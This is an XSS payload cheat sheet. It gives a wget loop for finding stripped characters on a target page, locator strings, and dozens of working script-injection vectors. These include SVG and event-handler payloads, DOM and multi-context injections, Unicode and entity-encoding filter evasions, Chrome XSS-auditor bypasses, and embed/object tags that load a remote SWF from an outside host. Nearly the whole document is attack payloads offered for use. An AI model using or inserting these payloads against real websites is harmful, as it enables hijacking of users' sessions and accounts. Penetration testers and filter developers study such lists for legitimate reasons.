# XSS

## Oneliner

### StrippedChar Finder
```
for i in {0..255};do a=%$(printf '%02x' $i);wget -qO- domain/page?p=abc123$a | grep abc123 >/dev/null && echo $a;done
```

## Attack vectors

### Locator
```
;555%3C%3E%22%27&
;00%EF%BC%9C99&
1<b0x&b0x=<b0x#0<b0x>

0=01<sin&1=02<sin&2=03<sin&3=04<sin&4=05<sin&5=06<sin&6=07<sin&7=08<sin&8=09<sin&9=10<sin&
a=01<sin&b=02<sin&c=03<sin&d=04<sin&e=05<sin&f=06<sin&g=07<sin&h=08<sin&i=09<sin&j=10<sin&k=11<sin&l=12<sin&m=13<sin&n=14<sin&o=15<sin&p=16<sin&q=17<sin&r=18<sin&s=19<sin&t=20<sin&u=21<sin&v=22<sin&w=23<sin&x=24<sin&y=25<sin&z=26<sin
```

### General
```
<svg/onload=alert(1)>
<svg><animate end=0 onend=alert('FF')>
<svg><animate attributename=x end=1 onend=alert('FF/Chrome')>
<svg><animate onbegin=alert('FF')>
<svg><animate attributeName=x onbegin=alert('FF/Chrome')>
<script/src=?callback=alert(document.domain)//></script>
<img src=x onerror=alert(1)>
<input onblur=write(1) autofocus><input autofocus>
<svg onload=alert(1)&nvgt;
javascript:&apos;<svg onload&equals;alert&lpar;1&rpar;&nvgt;&apos;
<svg onload=confirm(/XSSPOSED/)>
"autofocus/onfocus="alert('XSSPOSED')
"><svg onload=(alert)(/XSSPOSED/)>
"><svg onload=confirm(/XSSPOSED/)>
"><svg/onload=';alert(/XSSPOSED/);'>
--></script><svg/onload=';alert(/XSSPOSED/);'>
"><--`<img/src=` onerror=alert(/XSSPOSED/)> --!>
<script/xx>/**/alert(/XSSPOSED/)//
"-->'-alert(/xssposed/ )-'";
<script>$='XSSPOSED',alert($)< /script>-jobs/
```

Multi context
```
</title></script>"-alert(0)-"><svg onload=';alert(1);'>
```

Brute
```
</script><script/&and=/x>'&logic='-alert(1)</script>
<svg/onload=u=URL,l=u.length,location=/javascrip/.source%2Bu[1]%2Bu[4]%2B/alert/.source%2Bu[l-2]%2b1%2Bu[l-1]>#()
<brute style=animation-name:n onanimationend=alert(1337)><style>@keyframes n{}
<svg><use xlink:href='data:image/svg+xml,<svg id="brute" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><embed xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert(document.domain)"/></svg>#brute'>
<svg><use xlink:href=data:image/svg+xml;base64,PHN2ZyBpZD0iYnJ1dGUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiPg0KPGVtYmVkIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIiBzcmM9ImphdmFzY3JpcHQ6YWxlcnQoZG9jdW1lbnQuZG9tYWluKSIvPjwvc3ZnPg==#brute>
```

self injection
```
<script/src=csp.php?p=alert(1337)></script>
<javascript id=:alert(1337) onmouseover=location=tagName%2Bid>00000
<javascript id=:alert%26%2340;1337%26%2341 onmouseover=location=tagName%2Bid>00000
<javascript id=:alert%26lpar;1337%26rpar; onmouseover=location=tagName%2Bid>00000
```

hash
CORS call + innerHTML vector + js injections
```
#//3334957647/0/?0=">"<img src='-alert(1)-' onerror=";alert(1);">
```

### DOM
```
p="-alert(1337)-"<svg>
p&p="-alert(1337)-"
p=sin'-alert(document.domain)-'derella
```

### Universal
```
<p style=overflow:auto;font-size:1000px onscroll=alert(1337)>script<k/id=die></p>
```

### Filter evasion
utf8: [Table](http://www.utf8-chartable.de/unicode-utf8-table.pl?start=65280&number=128)
```
U+02BA, U+030E
<meta charset=utf-8>
<SCRİPT>alert(1)</SCRİPT> 
<SCRİPT/SRC=data:,alert(1)>
%CA%BA>%EF%BC%9Csvg/onload%EF%BC%9Dalert%EF%BC%881)>
```

uppercase
```
<SVG ONLOAD=&#97&#108&#101&#114&#116(1)>
<SVG ONLOAD=&%00#97&%00#108&%00#101&%00#114&%00#116(1)>
```

bypass validation
```
<xmp>
```

w/o parentheses
w/o onerror=
```
<video/src/id="onerror"onloadstart=top[id]=confirm;throw"1337">
```

stripped
```
<svg/x="> <script>alert(1)</script> <"onload=alert(9)>
```

eventhandler
```
"><sin/id="alert"onbeforescriptexecute="top[id](domain)
```

w/o =
w/o >
```
<iframe src=""srcdoc="data:,&lt;svg/onload&equals;alert(1)>"1=" sandbox>
```

### Chrome audit
```
<svg><script>0<(alert)(1337)</script>
<svg><script>0<[alert(1337)]</script>
">*/alert(1337)</script><script>/*<sin//
<iframe/src="data:text/html&p=<svg/onload=alert(1)>">
<script/src=data:&p=alert(1)></script>
<embed+allowscriptaccess=always+src="//brutelogic.com.br%26sol;2.swf%26num%3B
<object+allowscriptaccess=always+data="//brutelogic.com.br%26sol;2.swf%26num%3B
```

## Tips

SVG Content Type

```
Content-Type: image/svg+xml; charset=us-ascii
[...]

<svg onload=alert(1)>
```
